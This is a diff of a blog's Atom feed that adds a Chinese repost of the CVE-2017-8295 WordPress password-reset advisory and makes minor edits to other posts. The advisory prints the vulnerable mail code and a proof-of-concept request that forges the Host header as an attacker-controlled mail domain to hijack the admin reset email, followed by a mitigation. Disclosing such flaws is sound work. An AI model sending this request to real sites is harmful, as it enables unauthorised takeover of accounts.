@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://blog.unixmen.cn/"/>
-  <updated>2017-05-02T10:00:19.000Z</updated>
+  <updated>2017-05-05T01:28:24.000Z</updated>
   <id>http://blog.unixmen.cn/</id>
   
   <author>
@@ -14,6 +14,66 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>WordPress爆未经授权的密码重置漏洞</title>
+    <link href="http://blog.unixmen.cn/2017/05/05/WordPress%E7%88%86%E6%9C%AA%E7%BB%8F%E6%8E%88%E6%9D%83%E7%9A%84%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://blog.unixmen.cn/2017/05/05/WordPress爆未经授权的密码重置漏洞/</id>
+    <published>2017-05-05T01:14:35.000Z</published>
+    <updated>2017-05-05T01:28:24.000Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote>
+<p>漏洞提交者：Dawid Golunski<br>漏洞编号：CVE-2017-8295<br>发布日期：2017-05-03<br>修订版本：1.0<br>漏洞危害：中/高</p>
+</blockquote>
+<h2 id="I-漏洞"><a href="#I-漏洞" class="headerlink" title="I. 漏洞"></a>I. 漏洞</h2><p>WordPress内核&lt;= 4.7.4存在未经授权的密码重置(0day)</p>
+<h2 id="II-背景"><a href="#II-背景" class="headerlink" title="II. 背景"></a>II. 背景</h2><p>WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。截止2017年2月，Alexa排名前1000万的站点中约有27.5%使用该管理系统。据报道有超过6000万站点使用WordPress进行站点管理或者作为博客系统。</p>
+<h2 id="III-介绍"><a href="#III-介绍" class="headerlink" title="III. 介绍"></a>III. 介绍</h2><p>WordPress的重置密码功能存在漏洞，在某些情况下不需要使用之前的身份令牌验证获取密码重置链接。<br>该攻击可导致攻击者在未经授权的情况下获取用户Wordpress后台管理权限。</p>
+<h2 id="IV-描述"><a href="#IV-描述" class="headerlink" title="IV. 描述"></a>IV. 描述</h2><p>该漏洞源于WordPress默认使用不可信的数据。当生成一个密码重置邮件时应当是仅发送给与帐户相关联的电子邮件。<br>从下面的代码片段可以看出，在调用PHP mail()函数前创建了一个From email头</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">------[ wp-includes/pluggable.php ]------</div><div class="line"></div><div class="line">if ( !isset( $from_email ) ) &#123;</div><div class="line">        // Get the site domain and get rid of www.</div><div class="line">        $sitename = strtolower( $_SERVER[&apos;SERVER_NAME&apos;] );</div><div class="line">        if ( substr( $sitename, 0, 4 ) == &apos;www.&apos; ) &#123;</div><div class="line">                $sitename = substr( $sitename, 4 );</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $from_email = &apos;wordpress@&apos; . $sitename;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">-----------------------------------------</div></pre></td></tr></table></figure>
+<p>正如我们所看到的，Wordpress为了生成重置邮件创建的一个From/Return-Path(发件人/收件人)头，使用SERVER_NAME变量以获取服务器的主机名。<br>然而，诸如Apache的主流web服务器默认使用由客户端提供的主机名来设置SERVER_NAME变量（<a href="https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname" target="_blank" rel="external">参考Apache文档</a>）<br>由于SERVER_NAME可以进行修改，攻击者可以任意设置该值，例如attackers-mxserver.com<br>这将导致Wordpress的$from_email变为wordpress@attackers-mxserver.com，最终导致包含From/Return-Path(发件人/收件人)设置的密码重置邮件发送到了该恶意邮件地址。<br>至于攻击者可以修改哪那一封电子邮件的头信息，这取决于服务器环境（<a href="http://php.net/manual/en/function.mail.php" target="_blank" rel="external">参考PHP文档</a>）<br>基于邮件服务器的配置，可能导致被修改过邮件头的恶意收件人/发件人地址的电子邮件发送给WordPress用户。<br>这使得攻击者能够在不需要进行交互就可以截取本该是需要进行交互才能进行的操作的密码重置邮件。</p>
+<blockquote>
+<p>攻击场景：<br>如果攻击者知道用户的电子邮件地址。为了让密码重置邮件被服务器拒收，或者无法到达目标地址。他们可以先对用户的电子邮件帐户进行DoS攻击（通过发送多个超过用户磁盘配额的大文件邮件或攻击该DNS服务器）<br>某些自动回复可能会附加有邮件发送副本<br>发送多封密码重置邮件给用户，迫使用户对这些没完没了的密码重置邮件进行回复，回复中就包含的密码链接会发送给攻击者。</p>
+<h2 id="V-POC"><a href="#V-POC" class="headerlink" title="V. POC"></a>V. POC</h2></blockquote>
+<p>如果攻击者将类似下面的请求发送到默认可通过IP地址访问的Wordpress安装页面(IP-based vhost):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-----[ HTTP Request ]----</div><div class="line"></div><div class="line">POST /wp/wordpress/wp-login.php?action=lostpassword HTTP/1.1</div><div class="line">Host: injected-attackers-mxserver.com</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 56</div><div class="line"></div><div class="line">user_login=admin&amp;redirect_to=&amp;wp-submit=Get+New+Password</div></pre></td></tr></table></figure></p>
+<hr>
+<p>WordPress将触发管理员账户的密码重置功能<br>由于修改了主机头，SERVER_NAME变量将被设置为攻击者所选择的主机名，因此Wordpress会将以下电子邮件头信息和正文传递给/usr/bin/sendmail<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">------[ resulting e-mail ]-----</div><div class="line"></div><div class="line">Subject: [CompanyX WP] Password Reset</div><div class="line">Return-Path: &lt;wordpress@attackers-mxserver.com&gt;</div><div class="line">From: WordPress &lt;wordpress@attackers-mxserver.com&gt;</div><div class="line">Message-ID: &lt;e6fd614c5dd8a1c604df2a732eb7b016@attackers-mxserver.com&gt;</div><div class="line">X-Priority: 3</div><div class="line">MIME-Version: 1.0</div><div class="line">Content-Type: text/plain; charset=UTF-8</div><div class="line">Content-Transfer-Encoding: 8bit</div></pre></td></tr></table></figure></p>
+<p>有人请求将以下账户的密码进行重置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://companyX-wp/wp/wordpress/</div><div class="line">Username: admin</div></pre></td></tr></table></figure></p>
+<p>如果是弄错了，直接忽略该邮件就好。重置密码请访问以下地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://companyx-wp/wp/wordpress/wp-login.php?action=rp&amp;key=AceiMFmkMR4fsmwxIZtZ&amp;login=admin%3E</div></pre></td></tr></table></figure></p>
+<p>正如我们看到的，Return-Path, From, 以及Message-ID字段都是攻击者控制的域<br>通过bash脚本替换/usr/sbin/sendmail以执行头的验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">cat &gt; /tmp/outgoing-email</div></pre></td></tr></table></figure></p>
+<h2 id="VI-业务影响"><a href="#VI-业务影响" class="headerlink" title="VI. 业务影响"></a>VI. 业务影响</h2><p>在利用成功的基础上，攻击者可重置用户密码并且未经授权获取WordPress账户访问权限。</p>
+<h2 id="VII-系统影响"><a href="#VII-系统影响" class="headerlink" title="VII. 系统影响"></a>VII. 系统影响</h2><p>WordPress至最新版本4.7.4全部受影响</p>
+<h2 id="VIII-解决方案"><a href="#VIII-解决方案" class="headerlink" title="VIII. 解决方案"></a>VIII. 解决方案</h2><p>目前没有官方解决方案可用。作为临时解决方案，用户可以启用UseCanonicalName执行SERVER_NAME静态值（<a href="https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname" target="_blank" rel="external">参考Apache</a>）</p>
+<h2 id="IX-参考文献"><a href="#IX-参考文献" class="headerlink" title="IX. 参考文献"></a>IX. 参考文献</h2><p><a href="https://legalhackers.com" target="_blank" rel="external">https://legalhackers.com</a></p>
+<p><a href="https://ExploitBox.io" target="_blank" rel="external">https://ExploitBox.io</a></p>
+<p>Vendor site:</p>
+<p><a href="https://wordpress.org" target="_blank" rel="external">https://wordpress.org</a></p>
+<p><a href="http://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname" target="_blank" rel="external">http://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname</a></p>
+<p><a href="http://php.net/manual/en/function.mail.php" target="_blank" rel="external">http://php.net/manual/en/function.mail.php</a></p>
+<p><a href="https://tools.ietf.org/html/rfc5321" target="_blank" rel="external">https://tools.ietf.org/html/rfc5321</a></p>
+<blockquote>
+<p>转自FreeBuf.com</p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;
+&lt;p&gt;漏洞提交者：Dawid Golunski&lt;br&gt;漏洞编号：CVE-2017-8295&lt;br&gt;发布日期：2017-05-03&lt;br&gt;修订版本：1.0&lt;br&gt;漏洞危害：中/高&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;I-漏洞&quot;&gt;&lt;a hre
+    
+    </summary>
+    
+      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
+    
+      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="WordPress" scheme="http://blog.unixmen.cn/tags/WordPress/"/>
+    
+  </entry>
   
   <entry>
     <title>Docker私有镜像仓库节点部署</title>
@@ -297,10 +357,9 @@
     <link href="http://blog.unixmen.cn/2017/05/02/%E5%A6%82%E4%BD%95%E5%9C%A8Fedora%E4%B8%AD%E5%AE%89%E8%A3%85pip2%E6%88%96pip3/"/>
     <id>http://blog.unixmen.cn/2017/05/02/如何在Fedora中安装pip2或pip3/</id>
     <published>2017-05-02T03:24:19.000Z</published>
-    <updated>2017-05-02T10:09:26.000Z</updated>
+    <updated>2017-05-02T10:11:04.000Z</updated>
     
-    <content type="html"><![CDATA[<p>#如何在Fedora中安装pip2或pip3</p>
-<h2 id="文章简介"><a href="#文章简介" class="headerlink" title="文章简介"></a>文章简介</h2><p>pip 是一个简单易用的python包管理工具。本文简要介绍pip2及pip3 的两种安装方式，当然pip2和pip3在同一套系统中pip3 跟pyhon一样，2版本和3版本是可以并存的。</p>
+    <content type="html"><![CDATA[<h2 id="文章简介"><a href="#文章简介" class="headerlink" title="文章简介"></a>文章简介</h2><p>pip 是一个简单易用的python包管理工具。本文简要介绍pip2及pip3 的两种安装方式，当然pip2和pip3在同一套系统中pip3 跟pyhon一样，2版本和3版本是可以并存的。</p>
 <h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><ul>
 <li><p>首先我们清空我们系统中残留冗余包。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dnf clean all</div></pre></td></tr></table></figure>
@@ -354,8 +413,7 @@
     
     <summary type="html">
     
-      &lt;p&gt;#如何在Fedora中安装pip2或pip3&lt;/p&gt;
-&lt;h2 id=&quot;文章简介&quot;&gt;&lt;a href=&quot;#文章简介&quot; class=&quot;headerlink&quot; title=&quot;文章简介&quot;&gt;&lt;/a&gt;文章简介&lt;/h2&gt;&lt;p&gt;pip 是一个简单易用的python包管理工具。本文简要介绍pi
+      &lt;h2 id=&quot;文章简介&quot;&gt;&lt;a href=&quot;#文章简介&quot; class=&quot;headerlink&quot; title=&quot;文章简介&quot;&gt;&lt;/a&gt;文章简介&lt;/h2&gt;&lt;p&gt;pip 是一个简单易用的python包管理工具。本文简要介绍pip2及pip3 的两种安装方式，当然pip2和pip3在同一
     
     </summary>
     
@@ -1711,30 +1769,6 @@
     
     
       <category term="感恩" scheme="http://blog.unixmen.cn/tags/%E6%84%9F%E6%81%A9/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>第一篇博客</title>
-    <link href="http://blog.unixmen.cn/2017/02/17/first/"/>
-    <id>http://blog.unixmen.cn/2017/02/17/first/</id>
-    <published>2017-02-17T03:03:39.000Z</published>
-    <updated>2017-02-17T06:10:44.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>就这么开始吧，精彩内容敬请期待…</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;就这么开始吧，精彩内容敬请期待…&lt;/p&gt;
-
-    
-    </summary>
-    
-      <category term="生活" scheme="http://blog.unixmen.cn/categories/Life/"/>
-    
-    
-      <category term="开篇" scheme="http://blog.unixmen.cn/tags/%E5%BC%80%E7%AF%87/"/>
     
   </entry>
   
